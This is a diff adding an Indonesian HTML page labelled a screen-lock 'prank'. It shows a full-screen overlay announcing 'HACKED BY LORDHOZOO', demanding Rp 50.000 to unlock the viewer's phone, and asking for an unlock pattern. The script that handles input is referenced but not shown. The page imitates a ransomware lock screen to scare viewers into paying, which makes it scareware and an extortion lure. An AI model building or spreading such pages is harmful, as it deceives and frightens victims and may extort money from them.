@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prank Kunci Layar</title>
+    
+    <!-- Menambahkan Favicon -->
+    <link rel="icon" href="https://example.com/path-to-your-icon.ico" type="image/x-icon">
+
+    <!-- Menambahkan CSS langsung dalam HTML -->
+    <style>
+        /* Mengubah latar belakang halaman menjadi hitam dan teks menjadi putih */
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Gaya untuk overlay */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8); /* Latar belakang overlay hitam dengan transparansi */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1; /* Pastikan overlay berada di depan */
+        }
+
+        /* Gaya untuk pesan di dalam overlay */
+        .message {
+            text-align: center;
+            background-color: #333;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+            width: 80%;
+            max-width: 500px;
+            z-index: 2; /* Pastikan konten berada di atas overlay */
+        }
+
+        /* Gaya untuk elemen h1, h2 */
+        h1, h2 {
+            color: white;
+        }
+
+        /* Gaya untuk input dan tombol */
+        input, button {
+            padding: 10px;
+            margin-top: 10px;
+            width: 80%;
+            border-radius: 5px;
+            border: none;
+        }
+
+        input {
+            background-color: #444;
+            color: white;
+            margin-bottom: 10px;
+        }
+
+        button {
+            background-color: #28a745;
+            color: white;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+
+        /* Gaya untuk hasil */
+        .result-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <a href="https://ibb.co.com/spgzjW61">
+        <img src="https://i.ibb.co.com/0pnvqsF9/New-Project-61-C335-AC6.png" alt="New-Project-61-C335-AC6" border="0">
+    </a>
+    <div class="overlay" id="overlay">
+        <div class="message">
+            <h1>HACKED BY LORDHOZOO</h1>
+            <h2>YOUTUBE: LORDHOZOO</h2>
+            <h2>TIKTOK: LORDHOZOO</h2>
+            <p>RP : 50.000</p>
+            <p>TEMBUSAN UNTUK MEMBUKA KUNCI LAYAR HP ANDA</p>
+            <input type="password" id="inputCode" placeholder="Masukkan pola">
+            <button onclick="checkCode()">Kirim</button>
+            <p id="errorMessage" class="error"></p>
+        </div>
+    </div>
+    <div class="result-container" id="resultContainer" style="display: none;">
+        <h1>Selamat, anda hp anda bebas </h1>
+        <p>Tidak kami bebaskan anda sekian...</p>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
